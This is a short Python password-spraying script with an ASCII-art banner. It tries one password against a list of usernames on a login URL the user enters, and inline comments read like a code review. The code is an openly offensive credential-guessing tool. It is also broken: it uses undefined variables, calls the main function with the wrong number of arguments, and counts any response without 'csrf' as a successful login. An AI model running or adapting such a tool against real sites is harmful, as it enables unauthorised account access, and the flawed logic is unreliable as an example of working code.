import requests

#Code reviewed, time to hustle.
def passwordSpray(password: str, url: str) -> bool:
    print("""
     _____ _               _____                       _  ______            _        __                   
    /  __ | |             |  ___|                     | | | ___ \          | |      / _|                  
    | /  \| | __ _ ___ ___| |__ _ __ __ _ ___  ___  __| | | |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ 
    | |   | |/ _` / __/ __|  __| '__/ _` / __|/ _ \/ _` | | ___ | '__| | | | __/ _ |  _/ _ \| '__/ __/ _ \\
    | \__/| | (_| \__ \__ | |__| | | (_| \__ |  __| (_| | | |_/ | |  | |_| | ||  __| || (_) | | | (_|  __/
     \____|_|\__,_|___|___\____|_|  \__,_|___/\___|\__,_| \____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|\n\n""")
    
    for username in usernames:
        username = username.strip() # redundant, bad data (also doesn't account for spaces in between) alternatively: username = username.replace(" ", "")
        print(f"Trying:", {username})
        data = {"username": username,"password": password,"login":"submit"} # login value will only work for very few back-end oriented auth systems
        response = requests.post(url, data=data)
        if not r.ok: # error does nothing here, response.text returns string value, would recommend using r.ok to evaluate if not 200 status code
            pass
        if "csrf" in str(response.content):
            print("CSRF token detected") # you can add headers like: response = requests.post(url, data=data, headers=headers) and create a headers dict for the CSRF token
            return False
        else:
            print(f"Success: Username: ---> ", {username}, "\n", "Password: ---> ", {password})
            return True


if __name__ == '__main__':
    url = input("Enter Target Url: ")
    password = input("Enter Target Password: ")
    error = input("Enter Wrong User Error Message: ")
    
    try:
        passwordSpray()
    except:
        print("Some Error Occurred Please Check Your Internet Connection !!")

    #compile list from engagement notes
    with open("usernames.txt", "r") as usernames:
        passwordSpray(password,url,error)
    
    print("[!!] Username not in list")